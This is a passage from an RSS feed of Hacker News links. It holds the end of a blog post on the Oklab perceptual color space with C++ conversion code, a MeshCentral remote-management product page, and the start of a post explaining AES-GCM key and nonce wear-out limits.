mathvariant="normal">′</mi></mrow></msup><mo>)</mo></mrow><mrow><mn>3</mn></mrow></msup></mrow></mtd></mtr><mtr><mtd><mrow><msup><mrow><mo>(</mo><msup><mi>m</mi><mrow><mi mathvariant="normal">′</mi></mrow></msup><mo>)</mo></mrow><mrow><mn>3</mn></mrow></msup></mrow></mtd></mtr><mtr><mtd><mrow><msup><mrow><mo>(</mo><msup><mi>s</mi><mrow><mi mathvariant="normal">′</mi></mrow></msup><mo>)</mo></mrow><mrow><mn>3</mn></mrow></msup></mrow></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mo separator="true">,</mo><mspace width="2em"></mspace><mrow><mo fence="true">(</mo><mtable><mtr><mtd><mrow><mi>X</mi></mrow></mtd></mtr><mtr><mtd><mrow><mi>Y</mi></mrow></mtd></mtr><mtr><mtd><mrow><mi>Z</mi></mrow></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mo>=</mo><msup><mrow><msub><mi mathvariant="bold">M</mi><mn mathvariant="bold">1</mn></msub></mrow><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo>×</mo><mrow><mo fence="true">(</mo><mtable><mtr><mtd><mrow><mi>l</mi></mrow></mtd></mtr><mtr><mtd><mrow><mi>m</mi></mrow></mtd></mtr><mtr><mtd><mrow><mi>s</mi></mrow></mtd></mtr></mtable><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\begin{pmatrix} l' \\ m' \\ s' \end{pmatrix} = \mathbf{M_2}^{-1} \times \begin{pmatrix} L \\ a \\ b \end{pmatrix},\qquad \begin{pmatrix} l \\ m \\ s \end{pmatrix} = \begin{pmatrix} {(l')}^{3} \\ {(m')}^{3} \\ {(s')}^{3} \end{pmatrix},\qquad \begin{pmatrix} X \\ Y \\ Z \end{pmatrix} = \mathbf{M_1}^{-1} \times \begin{pmatrix} l \\ m \\ s \end{pmatrix}</annotation></semantics></math></span></span></span></p><h4 id="converting-from-linear-srgb-to-oklab">Converting from linear sRGB to Oklab <a href="#converting-from-linear-srgb-to-oklab"><span><svg viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg" enable-background="new 0 0 512 512" version="1.1" xml:space="preserve" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M459.654,233.373l-90.531,90.5c-49.969,50-131.031,50-181,0c-7.875-7.844-14.031-16.688-19.438-25.813  l42.063-42.063c2-2.016,4.469-3.172,6.828-4.531c2.906,9.938,7.984,19.344,15.797,27.156c24.953,24.969,65.563,24.938,90.5,0  l90.5-90.5c24.969-24.969,24.969-65.563,0-90.516c-24.938-24.953-65.531-24.953-90.5,0l-32.188,32.219  c-26.109-10.172-54.25-12.906-81.641-8.891l68.578-68.578c50-49.984,131.031-49.984,181.031,0  C509.623,102.342,509.623,183.389,459.654,233.373z M220.326,382.186l-32.203,32.219c-24.953,24.938-65.563,24.938-90.516,0  c-24.953-24.969-24.953-65.563,0-90.531l90.516-90.5c24.969-24.969,65.547-24.969,90.5,0c7.797,7.797,12.875,17.203,15.813,27.125  c2.375-1.375,4.813-2.5,6.813-4.5l42.063-42.047c-5.375-9.156-11.563-17.969-19.438-25.828c-49.969-49.984-131.031-49.984-181.016,0  l-90.5,90.5c-49.984,50-49.984,131.031,0,181.031c49.984,49.969,131.031,49.969,181.016,0l68.594-68.594  C274.561,395.092,246.42,392.342,220.326,382.186z"></path></svg><span></span></span></a></h4><p>Since this will be a common use case, here is the code to convert linear sRGB values to Oklab and back. To compute linear sRGB values, see <a href="https://bottosson.github.io/posts/colorwrong/#what-can-we-do%3F">my previous post</a>.</p><p>The code is in C++, but without any fancy features so should be easy to translate. The code is available in public domain, feel free to use it any way you please.</p><pre><code>struct Lab {float L; float a; float b;};
struct RGB {float r; float g; float b;};

Lab linear_srgb_to_oklab(RGB c) 
{
    float l = 0.4121656120f * c.r + 0.5362752080f * c.g + 0.0514575653f * c.b;
    float m = 0.2118591070f * c.r + 0.6807189584f * c.g + 0.1074065790f * c.b;
    float s = 0.0883097947f * c.r + 0.2818474174f * c.g + 0.6302613616f * c.b;

    float l_ = cbrtf(l);
    float m_ = cbrtf(m);
    float s_ = cbrtf(s);

    return {
        0.2104542553f*l_ + 0.7936177850f*m_ - 0.0040720468f*s_,
        1.9779984951f*l_ - 2.4285922050f*m_ + 0.4505937099f*s_,
        0.0259040371f*l_ + 0.7827717662f*m_ - 0.8086757660f*s_,
    };
}

RGB oklab_to_linear_srgb(Lab c) 
{
    float l_ = c.L + 0.3963377774f * c.a + 0.2158037573f * c.b;
    float m_ = c.L - 0.1055613458f * c.a - 0.0638541728f * c.b;
    float s_ = c.L - 0.0894841775f * c.a - 1.2914855480f * c.b;

    float l = l_*l_*l_;
    float m = m_*m_*m_;
    float s = s_*s_*s_;

    return {
        + 4.0767245293f*l - 3.3072168827f*m + 0.2307590544f*s,
        - 1.2681437731f*l + 2.6093323231f*m - 0.3411344290f*s,
        - 0.0041119885f*l - 0.7034763098f*m + 1.7068625689f*s,
    };
}
</code></pre><p>This is everything you need to use the Oklab color space! If you need a simple perceptual color space, try it out.</p><p>The rest of the post will go into why a new color space was needed, how it has been constructed and how it compares with existing color spaces.</p><hr><p>What properties does a perceptual color space need to satisfy to be useful for image processing? The answer to this is always going to be a bit subjective, but based on my experience, these are a good set of requirements:</p><blockquote><ul><li><strong>Should be an opponent color space</strong>, similar to for example <a href="https://en.wikipedia.org/wiki/CIELAB_color_space">CIELAB</a>.</li><li><strong>Should prediction of lightness, chroma and hue well</strong>. <span><span><math><semantics><mrow><mi>L</mi></mrow><annotation encoding="application/x-tex">L</annotation></semantics></math></span></span>, <span><span><math><semantics><mrow><mi>C</mi></mrow><annotation encoding="application/x-tex">C</annotation></semantics></math></span></span> and <span><span><math><semantics><mrow><mi>h</mi></mrow><annotation encoding="application/x-tex">h</annotation></semantics></math></span></span> should be perceived as orthogonal, so one can be altered without affecting the other two. This is useful for things like turning an image black and white and increasing colorfulness without introducing hue shifts etc.</li><li><strong>Blending two colors should result in even transitions</strong>. The transition colors should appear to be in between the blended colors (e.g. passing through a warmer color than either original color is not good).</li><li><strong>Should assume a D65 whitepoint</strong>. This is what common color spaces like sRGB, rec2020 and Display P3 uses.</li><li><strong>Should behave well numerically</strong>. The model should be easy to compute, numerically stable and differentiable.</li><li><strong>Should assume normal well lit viewing conditions</strong>. The complexity of supporting different viewing conditions is not practical in most applications. Other models could be used in conjunction if this is needed in some case.</li><li><strong>If the scale/exposure of colors are changed, the perceptual coordinates should just be scaled by a factor</strong>. More complex models that depend on absolute luminance should be avoided since the viewing conditions can not be accurately controlled and incorrect behavior would be confusing.</li></ul></blockquote><h3 id="what-about-existing-models%3F">What about existing models? <a href="#what-about-existing-models%3F"><span><svg viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg" enable-background="new 0 0 512 512" version="1.1" xml:space="preserve" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M459.654,233.373l-90.531,90.5c-49.969,50-131.031,50-181,0c-7.875-7.844-14.031-16.688-19.438-25.813  l42.063-42.063c2-2.016,4.469-3.172,6.828-4.531c2.906,9.938,7.984,19.344,15.797,27.156c24.953,24.969,65.563,24.938,90.5,0  l90.5-90.5c24.969-24.969,24.969-65.563,0-90.516c-24.938-24.953-65.531-24.953-90.5,0l-32.188,32.219  c-26.109-10.172-54.25-12.906-81.641-8.891l68.578-68.578c50-49.984,131.031-49.984,181.031,0  C509.623,102.342,509.623,183.389,459.654,233.373z M220.326,382.186l-32.203,32.219c-24.953,24.938-65.563,24.938-90.516,0  c-24.953-24.969-24.953-65.563,0-90.531l90.516-90.5c24.969-24.969,65.547-24.969,90.5,0c7.797,7.797,12.875,17.203,15.813,27.125  c2.375-1.375,4.813-2.5,6.813-4.5l42.063-42.047c-5.375-9.156-11.563-17.969-19.438-25.828c-49.969-49.984-131.031-49.984-181.016,0  l-90.5,90.5c-49.984,50-49.984,131.031,0,181.031c49.984,49.969,131.031,49.969,181.016,0l68.594-68.594  C274.561,395.092,246.42,392.342,220.326,382.186z"></path></svg><span></span></span></a></h3><p>Let’s look at existing models and how they stack up against these requirements. Further down there are graphs that illustrate some of these issues.</p><blockquote><ul><li><strong><a href="https://en.wikipedia.org/wiki/CIELAB_color_space">CIELAB</a> and <a href="https://en.wikipedia.org/wiki/CIELUV">CIELUV</a></strong> – Largest issue is their inability to predict hue. In particular blue hues are predicted badly. Other smaller issues exist as well</li><li><strong><a href="https://en.wikipedia.org/wiki/CIECAM02">CIECAM02-UCS</a> and the newer CAM16-UCS</strong> – Does a good job at being perceptually uniform overall, but doesn’t meet other requirements: Bad numerical behavior, it is not scale invariant and blending does not behave well because of its compression of chroma. Hue uniformity is decent, but other models predict it more accurately.</li><li><strong><a href="https://en.wikipedia.org/wiki/OSA-UCS">OSA-UCS</a></strong> – Overall does a good job. The transformation to OSA-UCS lacks an analytical inverse unfortunately which makes it impractical.</li><li><strong><a href="https://scholarworks.rit.edu/theses/2858/">IPT</a></strong> – Does a great job modelling hue uniformity. Doesn’t predict lightness and chroma well unfortunately, but meets all other requirements. Is simple computationally and does not depend on the scale/exposure.</li><li><strong><a href="https://www.osapublishing.org/oe/fulltext.cfm?uri=oe-25-13-15131&amp;id=368272">JzAzBz</a></strong> – Overall does a fairly good job. Designed to have uniform scaling of lightness for HDR data. While useful in some cases this introduces a dependence on the scale/exposure that makes it hard to use in general cases.</li><li><strong><a href="https://en.wikipedia.org/wiki/HSL_and_HSV">HSV</a> representation of sRGB</strong> – Only on this list because it is widely used. Does not meet any of the requirements except having a D65 whitepoint.</li></ul></blockquote><p>So, all in all, all these existing models have drawbacks.</p><p>Out of all of these, two models stand out: CAM16-UCS, for being the model with best properties of perceptual uniformity overall, and IPT for having a simple computational structure that meets all the requirements besides predicting lightness and chroma well.</p><p>For this reason it is reasonable to try to make a new color space, with the same computational structure as IPT, but that performs closer to CAM16-UCS in terms of predicting lightness and chroma. This exploration resulted in Oklab.</p><h3 id="how-oklab-was-derived">How Oklab was derived <a href="#how-oklab-was-derived"><span><svg viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg" enable-background="new 0 0 512 512" version="1.1" xml:space="preserve" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M459.654,233.373l-90.531,90.5c-49.969,50-131.031,50-181,0c-7.875-7.844-14.031-16.688-19.438-25.813  l42.063-42.063c2-2.016,4.469-3.172,6.828-4.531c2.906,9.938,7.984,19.344,15.797,27.156c24.953,24.969,65.563,24.938,90.5,0  l90.5-90.5c24.969-24.969,24.969-65.563,0-90.516c-24.938-24.953-65.531-24.953-90.5,0l-32.188,32.219  c-26.109-10.172-54.25-12.906-81.641-8.891l68.578-68.578c50-49.984,131.031-49.984,181.031,0  C509.623,102.342,509.623,183.389,459.654,233.373z M220.326,382.186l-32.203,32.219c-24.953,24.938-65.563,24.938-90.516,0  c-24.953-24.969-24.953-65.563,0-90.531l90.516-90.5c24.969-24.969,65.547-24.969,90.5,0c7.797,7.797,12.875,17.203,15.813,27.125  c2.375-1.375,4.813-2.5,6.813-4.5l42.063-42.047c-5.375-9.156-11.563-17.969-19.438-25.828c-49.969-49.984-131.031-49.984-181.016,0  l-90.5,90.5c-49.984,50-49.984,131.031,0,181.031c49.984,49.969,131.031,49.969,181.016,0l68.594-68.594  C274.561,395.092,246.42,392.342,220.326,382.186z"></path></svg><span></span></span></a></h3><p>To derive Oklab, three datasets were used:</p><ul><li>A generated data set of pairs of colors with the same lightness but random hue and chroma, generated using CAM16 and normal viewing conditions. Colors were limited to be within Pointer’s Gamut – the set of possible surface colors.</li><li>A generated data set of pairs of colors with the same chroma but random hue and lightness, generated using CAM16 and normal viewing conditions. Colors were limited to be within Pointer’s Gamut</li><li>The <a href="https://github.com/nschloe/colorio/blob/master/colorio/data/ebner_fairchild.yaml">uniform perceived hue</a> data used to derive IPT. From this data, colors were combined into pairs of colors with equal perceived hue.</li></ul><p>These datasets can be used to test prediction of lightness, chroma and hue respectively. If a color space accurately models <span><span><math><semantics><mrow><mi>L</mi></mrow><annotation encoding="application/x-tex">L</annotation></semantics></math></span></span>, <span><span><math><semantics><mrow><mi>C</mi></mrow><annotation encoding="application/x-tex">C</annotation></semantics></math></span></span> and <span><span><math><semantics><mrow><mi>h</mi></mrow><annotation encoding="application/x-tex">h</annotation></semantics></math></span></span>, then all pairs in lightness dataset should have the same value for <span><span><math><semantics><mrow><mi>L</mi></mrow><annotation encoding="application/x-tex">L</annotation></semantics></math></span></span>, all pairs in the chroma dataset the same value for <span><span><math><semantics><mrow><mi>C</mi></mrow><annotation encoding="application/x-tex">C</annotation></semantics></math></span></span> and all pairs in the hue dataset the same values for <span><span><math><semantics><mrow><mi>h</mi></mrow><annotation encoding="application/x-tex">h</annotation></semantics></math></span></span>.</p><p>To test a color space it is not possible to simply check the distance in predictions in the tested color space however, since that will depend on the scaling of the color space. It is also not desirable to exactly predict ground truth values for <span><span><math><semantics><mrow><mi>L</mi></mrow><annotation encoding="application/x-tex">L</annotation></semantics></math></span></span>, <span><span><math><semantics><mrow><mi>C</mi></mrow><annotation encoding="application/x-tex">C</annotation></semantics></math></span></span> and <span><span><math><semantics><mrow><mi>h</mi></mrow><annotation encoding="application/x-tex">h</annotation></semantics></math></span></span>, since it is more important that our model has perceptually orthogonal coordinates, than that the model has the same spacing within each coordinate.</p><p>Instead the following approach was used to create an error metric independent of the color space:</p><ul><li>For each dataset all the pairs are converted to the tested color space.</li><li>Coordinates that are supposed to be the same within a pair are swapped to generate a new set of altered pairs:<ul><li>For the lightness dataset, the L coordinates are swapped between the pairs, and so on.</li><li>These altered pair would be equal to the original pair if the model predicts the datasets perfectly.</li></ul></li><li>The perceived distance between the original colors and the altered colors are are computed using <a href="https://en.wikipedia.org/wiki/Color_difference">CIEDE2000</a>.</li><li>The error for each pair is given as the minimum of the two color differences.</li><li>The error for the entire dataset is the root mean squared error of the color differences.</li></ul><p>Oklab was derived by optimizing the parameters of a color space with the same structure as IPT, to get a low error on all the datasets. For completeness, here is the structure of the color space – the parameters to optimize are the 3x3 matrices <span><span><math><semantics><mrow><mrow><msub><mi mathvariant="bold">M</mi><mn mathvariant="bold">1</mn></msub></mrow></mrow><annotation encoding="application/x-tex">\mathbf{M_1}</annotation></semantics></math></span></span> and <span><span><math><semantics><mrow><mrow><msub><mi mathvariant="bold">M</mi><mn mathvariant="bold">2</mn></msub></mrow></mrow><annotation encoding="application/x-tex">\mathbf{M_2}</annotation></semantics></math></span></span> and the positive number <span><span><math><semantics><mrow><mi>γ</mi></mrow><annotation encoding="application/x-tex">\gamma</annotation></semantics></math></span></span>.</p><p><span><span><span><math><semantics><mrow><mrow><mo fence="true">(</mo><mtable><mtr><mtd><mrow><mi>l</mi></mrow></mtd></mtr><mtr><mtd><mrow><mi>m</mi></mrow></mtd></mtr><mtr><mtd><mrow><mi>s</mi></mrow></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mo>=</mo><mrow><msub><mi mathvariant="bold">M</mi><mn mathvariant="bold">1</mn></msub></mrow><mo>×</mo><mrow><mo fence="true">(</mo><mtable><mtr><mtd><mrow><mi>X</mi></mrow></mtd></mtr><mtr><mtd><mrow><mi>Y</mi></mrow></mtd></mtr><mtr><mtd><mrow><mi>Z</mi></mrow></mtd></mtr></mtable><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\begin{pmatrix} l \\ m \\ s \end{pmatrix} = \mathbf{M_1} \times \begin{pmatrix} X \\ Y \\ Z \end{pmatrix}</annotation></semantics></math></span></span></span></p><p><span><span><span><math><semantics><mrow><mrow><mo fence="true">(</mo><mtable><mtr><mtd><mrow><mi>L</mi></mrow></mtd></mtr><mtr><mtd><mrow><mi>a</mi></mrow></mtd></mtr><mtr><mtd><mrow><mi>b</mi></mrow></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mo>=</mo><mrow><msub><mi mathvariant="bold">M</mi><mn mathvariant="bold">2</mn></msub></mrow><mo>×</mo><mrow><mo fence="true">(</mo><mtable><mtr><mtd><mrow><msup><mi>l</mi><mi>γ</mi></msup></mrow></mtd></mtr><mtr><mtd><mrow><msup><mi>m</mi><mi>γ</mi></msup></mrow></mtd></mtr><mtr><mtd><mrow><msup><mi>s</mi><mi>γ</mi></msup></mrow></mtd></mtr></mtable><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\begin{pmatrix} L \\ a \\ b \end{pmatrix} = \mathbf{M_2} \times \begin{pmatrix} l^\gamma \\ m^\gamma \\ s^\gamma \end{pmatrix}</annotation></semantics></math></span></span></span></p><p>A couple of extra …</p></div></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://bottosson.github.io/posts/oklab/">https://bottosson.github.io/posts/oklab/</a></em></p>]]>
            </description>
            <link>https://bottosson.github.io/posts/oklab/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25525726</guid>
            <pubDate>Thu, 24 Dec 2020 07:34:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[MeshCentral: Self-hosted web-based management of remote computers]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25525535">thread link</a>) | @aiNohY6g
<br/>
December 23, 2020 | https://www.meshcommander.com/meshcentral2 | <a href="https://web.archive.org/web/*/https://www.meshcommander.com/meshcentral2">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div jscontroller="sGwD4d" jsaction="zXBUYb:zTPCnb;zQF9Uc:Qxe3nd;" jsname="F57UId"><div><div id="h.772be894b56c9933_256"><div><div><p dir="ltr">Connect to your home or office devices from anywhere in the world using MeshCentral, the open source, remote monitoring and management server. Once installed, each enabled computer will show up in the "My Devices" section of the web site and will be able to perform remote desktop, remote terminal, file transfers and more. Get started by installing a MeshCentral server of your own or if you are not familiar with MeshCentral, you can try the public server at your own risk at <span><a href="https://www.google.com/url?q=https%3A%2F%2Fmeshcentral.com&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNF72XMOagiPwq0rSbmLUbf3ea9sZw" target="_blank">MeshCentral.com</a></span>. You can install your own server on Linux or Windows, it will run on anything from a large cloud instance to a Raspberry Pi. This is still beta code. <span><strong>Your privacy matters</strong></span>: When installing your own MeshCentral server, no usage data or telemetry is collected.</p><h3 id="h.p_I7Fa7qSzsHeJ" dir="ltr" tabindex="-1"></h3><ul><li dir="ltr"><p dir="ltr"><span><a href="https://www.google.com/url?q=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fmeshcentral&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNGlxrm4X04dUy1SJBLzKJMhuITNkQ" target="_blank">Use NPM to download &amp; install</a></span> - NodeJS application, Apache 2.0 License.</p></li><li dir="ltr"><p dir="ltr"><span><a href="https://www.google.com/url?q=https%3A%2F%2Finfo.meshcentral.com%2Fdownloads%2FMeshCentral2%2FMeshCentralInstaller-2.9.exe&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNGSz1tqKwy-e65faDtHoEfv2V-pZA" target="_blank">Windows Installer v2.9</a></span> - Win32 executable, Apache 2.0 License.</p></li></ul><h3 id="h.p_NI8XlBIe3JF7" dir="ltr" tabindex="-1"></h3><ul><li dir="ltr"><p dir="ltr"><span><a href="https://www.google.com/url?q=https%3A%2F%2Finfo.meshcentral.com%2Fdownloads%2FMeshCentral2%2FMeshCentral2UserGuide-0.2.9.pdf&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNF6k7CRu8xhJ6UjuKqTKrGLJ1YPLg" target="_blank">User's Guide v0.2.9</a></span> - PDF document.</p></li><li dir="ltr"><p dir="ltr"><span><a href="https://www.google.com/url?q=https%3A%2F%2Finfo.meshcentral.com%2Fdownloads%2FMeshCentral2%2FMeshCentral2InstallGuide-0.1.0.pdf&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNENA3FWn6JCC3RU6xPn6JvBklkltw" target="_blank">Install Guide v0.1.0</a></span> - PDF document.</p></li><li dir="ltr"><p dir="ltr"><span><a href="https://www.google.com/url?q=https%3A%2F%2Finfo.meshcentral.com%2Fdownloads%2FMeshCentral2%2FMeshCentral2DesignArchitecture.pdf&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNEJWbeXE64eROflRUP2DbLMUKYXbA" target="_blank">Design &amp; Architecture Guide v0.0.4</a></span> - PDF document.</p></li><li dir="ltr"><p dir="ltr"><span><a href="http://www.google.com/url?q=http%3A%2F%2Finfo.meshcentral.com%2Fdownloads%2FMeshCentral2%2FMeshCentral2RouterUserGuide-0.0.2.pdf&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNHYNX3jlmoBOwMEZkI22RMgrfYt4w" target="_blank">MeshCentral Router User Guide v0.0.2</a></span> - PDF document.</p></li><li dir="ltr"><p dir="ltr"><span><a href="https://www.google.com/url?q=https%3A%2F%2Finfo.meshcentral.com%2Fdownloads%2FMeshCentral2%2FMeshCtrlUsersGuide-0.0.1.pdf&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNEP_2gB0THJK7zOapJI_i3A1TGp8A" target="_blank">MeshCtrl User Guide v0.0.1</a></span> - PDF document.</p></li><li dir="ltr"><p dir="ltr"><span><a href="https://www.google.com/url?q=https%3A%2F%2Finfo.meshcentral.com%2Fdownloads%2FMeshCentral2%2FMeshCentral2ManagementFeaturesGuide.pdf&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNEsQ0B8LCeoaoOxx7YlOFBjgMUfgw" target="_blank">Manageability Features</a></span> - Single page PDF document.</p></li><li dir="ltr"><p dir="ltr"><span><a href="https://www.google.com/url?q=https%3A%2F%2Finfo.meshcentral.com%2Fdownloads%2FMeshCentral2%2FMeshCentral2SecurityFeaturesGuide.pdf&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNFFgy77nDwf9m2z5yPPTYqWsxiVMg" target="_blank">Security Features</a></span> - Single page PDF document.</p></li></ul><h3 id="h.p_FGUfZPmtZThQ" dir="ltr" tabindex="-1"></h3><ul><li dir="ltr"><p dir="ltr">Get the latest update: <span><a href="https://www.google.com/url?q=https%3A%2F%2Fmeshcentral2.blogspot.com%2F&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNEmr_JWg6uvu2brOrDffCRKXTTLLw" target="_blank">News Blog</a></span>.</p></li><li dir="ltr"><p dir="ltr">Comments and feedback: <span><a href="https://www.google.com/url?q=https%3A%2F%2Fwww.reddit.com%2Fr%2FMeshCentral%2F&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNHE2mphqK_2uoHNaJq8inmk3COfBQ" target="_blank">Reddit Forum</a></span>.</p></li></ul><h3 id="h.p_nidQqr8rakPZ" dir="ltr" tabindex="-1"></h3><p dir="ltr">More Videos on the <span><a href="https://www.meshcommander.com/meshcentral2/tutorials">Tutorials page</a></span></p></div></div></div></div></div></div></div></div>]]>
            </description>
            <link>https://www.meshcommander.com/meshcentral2</link>
            <guid isPermaLink="false">hacker-news-small-sites-25525535</guid>
            <pubDate>Thu, 24 Dec 2020 06:49:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cryptographic Wear-Out for Symmetric Encryption]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25525450">thread link</a>) | @todsacerdoti
<br/>
December 23, 2020 | https://soatok.blog/2020/12/24/cryptographic-wear-out-for-symmetric-encryption/ | <a href="https://web.archive.org/web/*/https://soatok.blog/2020/12/24/cryptographic-wear-out-for-symmetric-encryption/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<div>

			
<p>As we look upon the sunset of a remarkably tiresome year, I thought it would be appropriate to talk about <strong>cryptographic wear-out</strong>.</p>



<h3>What is cryptographic wear-out?</h3>



<p>It’s the threshold when you’ve used the same key to encrypt so much data that you should probably switch to a new key before you encrypt any more. Otherwise, you might let someone capable of observing all your encrypted data perform interesting attacks that compromise the security of the data you’ve encrypted.</p>



<div><figure><img data-attachment-id="126" data-permalink="https://soatok.blog/professor/" data-orig-file="https://soatok.files.wordpress.com/2020/04/professor.png" data-orig-size="224,224" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Professor Furry" data-image-description="" data-medium-file="https://soatok.files.wordpress.com/2020/04/professor.png?w=224" data-large-file="https://soatok.files.wordpress.com/2020/04/professor.png?w=224" src="https://soatok.files.wordpress.com/2020/04/professor.png?w=224" alt="Soatok Explains it All" srcset="https://soatok.files.wordpress.com/2020/04/professor.png 224w, https://soatok.files.wordpress.com/2020/04/professor.png?w=150 150w" sizes="(max-width: 224px) 100vw, 224px"><figcaption>My definitions always aim to be more understandable than pedantically correct.<br>(Art by <a href="https://twitter.com/Swizzlestixick">Swizz</a>)</figcaption></figure></div>



<p>The exact value of the threshold varies depending on how exactly you’re encrypting data (n.b. AEAD modes, block ciphers + cipher modes, etc. each have different wear-out thresholds due to their composition).</p>



<p>Let’s take a look at the wear-out limits of the more popular <a href="https://soatok.blog/2020/07/12/comparison-of-symmetric-encryption-methods/">symmetric encryption methods</a>, and calculate those limits ourselves.</p>



<h2>Specific Ciphers and Modes</h2>



<div><figure><img data-attachment-id="1615" data-permalink="https://soatok.blog/2020/10/16/commission-prices-for-furries-and-artists/soatok_stickerpackedit-math/" data-orig-file="https://soatok.files.wordpress.com/2020/10/soatok_stickerpackedit-math.png" data-orig-size="512,512" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Soatok_STICKERPACKEDIT-Math" data-image-description="" data-medium-file="https://soatok.files.wordpress.com/2020/10/soatok_stickerpackedit-math.png?w=300" data-large-file="https://soatok.files.wordpress.com/2020/10/soatok_stickerpackedit-math.png?w=512" src="https://soatok.files.wordpress.com/2020/10/soatok_stickerpackedit-math.png?w=512" alt="I did the math" srcset="https://soatok.files.wordpress.com/2020/10/soatok_stickerpackedit-math.png 512w, https://soatok.files.wordpress.com/2020/10/soatok_stickerpackedit-math.png?w=150 150w, https://soatok.files.wordpress.com/2020/10/soatok_stickerpackedit-math.png?w=300 300w" sizes="(max-width: 512px) 100vw, 512px"><figcaption>(Art by <a href="https://twitter.com/lynxvsjackalope">Khia</a>. Poorly edited by the author.)</figcaption></figure></div>



<h3 id="aes-gcm-limits">Cryptographic Limits for AES-GCM</h3>



<p>I’ve written about AES-GCM before (and <a href="https://soatok.blog/2020/05/13/why-aes-gcm-sucks/">why I think it sucks</a>).</p>



<p>AES-GCM is a construction that combines AES-CTR with an authenticator called GMAC, whose consumption of nonces looks something like this:</p>



<ul><li>Calculating H (used in GHASH for all messages encrypted under the same key, regardless of nonce):<ul><li><code>Encrypt(00000000 00000000 00000000 00000000)</code></li></ul></li><li>Calculating J<sub>0</sub> (the pre-counter block):<ul><li>If the nonce is 96 bits long:<ul><li><code>NNNNNNNN NNNNNNNN NNNNNNNN 00000001</code> where the <code>N</code> spaces represent the nonce hexits.</li></ul></li><li>Otherwise:<ul><li><code>s = 128 * ceil(len(nonce)/nonce) - len(nonce)</code></li></ul><ul><li><code>J0 = GHASH(H, nonce || zero(s+64) || int2bytes(len(nonce))</code></li></ul></li></ul></li><li>Each block of data encrypted uses J0 + block counter (starting at 1) as a CTR nonce.</li><li>J0 is additionally used as the nonce to calculate the final GMAC tag.</li></ul>



<p>AES-GCM is one of the algorithms where it’s easy to separately calculate the safety limits per message (i.e. for a given nonce and key), as well as for all messages under a key.</p>



<h4>AES-GCM Single Message Length Limits</h4>



<p>In the simplest case (nonce is 96 bits), you end up with the following nonces consumed:</p>



<ul><li>For each key: <code>00000000 00000000 00000000 00000000</code></li><li>For each (nonce, key) pair:<ul><li><code>NNNNNNNN NNNNNNNN NNNNNNNN 000000001</code> for J0</li><li><code>NNNNNNNN NNNNNNNN NNNNNNNN 000000002</code> for encrypting the first 16 bytes of plaintext</li><li><code>NNNNNNNN NNNNNNNN NNNNNNNN 000000003</code> for the next 16 bytes of plaintext…</li><li>…</li><li><code>NNNNNNNN NNNNNNNN NNNNNNNN FFFFFFFFF</code> for the final 16 bytes of plaintext.</li></ul></li></ul>



<p>From here, it’s pretty easy to see that you can encrypt the blocks from <code>00000002</code> to <code>FFFFFFFF</code> without overflowing and creating a nonce reuse. This means that each (key, nonce) can be used to encrypt a single message up to <img src="https://s0.wp.com/latex.php?latex=2%5E%7B32%7D+-+2&amp;bg=0a0a0a&amp;fg=f0f0f0&amp;s=3&amp;c=20201002" alt="2^{32} - 2" title="2^{32} - 2"> blocks of the underlying ciphertext.</p>



